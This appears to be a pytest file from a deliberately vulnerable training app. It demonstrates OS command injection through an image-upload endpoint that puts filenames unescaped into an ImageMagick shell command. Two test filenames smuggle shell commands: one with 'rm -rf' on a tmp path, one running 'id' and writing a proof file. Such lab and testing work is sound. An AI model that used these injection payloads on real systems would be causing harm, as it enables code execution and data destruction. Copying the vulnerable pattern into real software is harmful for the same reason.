"""Demonstrates that vulnerable/upload/image_processor.py's dangerous
behavior (shelling out to ImageMagick's `convert` with the uploaded
filename interpolated into the command line, unescaped -- CWE-78) is real,
using the actual HTTP API and processing module in isolation (no mocking):
a filename carrying shell metacharacters, declared Content-Type:
image/jpeg (which is all this API validates), gets executed as part of
generating a thumbnail.

/api/images/upload itself is no longer directly attacker-reachable (its
token is never disclosed -- see app/services/rotation.py); the `service_token`
fixture here represents this app's own backend, the only caller that
still holds it. tests/test_catalog_sync.py is what proves an outside
attacker can still reach this same processing bug, through
POST /api/catalog/products's own weak filename check instead.
"""
import io
import os

import pytest

from app.config import config

PROOF_FILENAME = "shoplab_rce_proof.txt"


def test_content_type_confusion_allows_any_filename(client, service_token):
    """A filename carrying shell metacharacters, claiming image/jpeg,
    passes the API's content-type check -- it never looks at the filename
    at all, only the declared Content-Type header."""
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(b"whatever"), "x.jpg;rm -rf /tmp/whatever #.jpg", "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201, "a shell-metacharacter-laden filename with an allowed Content-Type must be accepted"
    assert resp.get_json()["processing"]["mode"] == "thumbnail"


@pytest.mark.skipif(
    os.name != "posix",
    reason="the injected filename relies on POSIX shell (/bin/sh) semantics -- ';' sequencing and '#' comments",
)
def test_malicious_filename_actually_executes_via_command_injection(client, service_token):
    """End-to-end proof of remote code execution via the upload chain. See
    vulnerable/upload/image_processor.py's module docstring for the full
    mechanism, and tests/test_catalog_sync.py for why the injected command
    must avoid literal '/' characters."""
    malicious_filename = f"x.jpg;id>{PROOF_FILENAME} #.jpg"
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(b"whatever"), malicious_filename, "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201

    proof_path = os.path.join(config.UPLOAD_DIR, PROOF_FILENAME)
    assert os.path.exists(proof_path), "the injected 'id' command should have executed and written this file"
    assert "uid=" in open(proof_path).read()

    os.remove(proof_path)


def test_genuine_image_extension_is_processed_as_thumbnail(client, service_token):
    """Control case: an ordinary filename with no injection still takes the
    same code path (there is no separate "safe" mode) -- the vulnerability
    is in how that path handles the filename, not in which path is taken."""
    resp = client.post(
        "/api/images/upload",
        data={"file": (io.BytesIO(b"\xff\xd8\xff\xe0 not really a jpeg"), "safe.jpg", "image/jpeg")},
        content_type="multipart/form-data",
        headers={"X-Service-Token": service_token},
    )
    assert resp.status_code == 201
    assert resp.get_json()["processing"]["mode"] == "thumbnail"
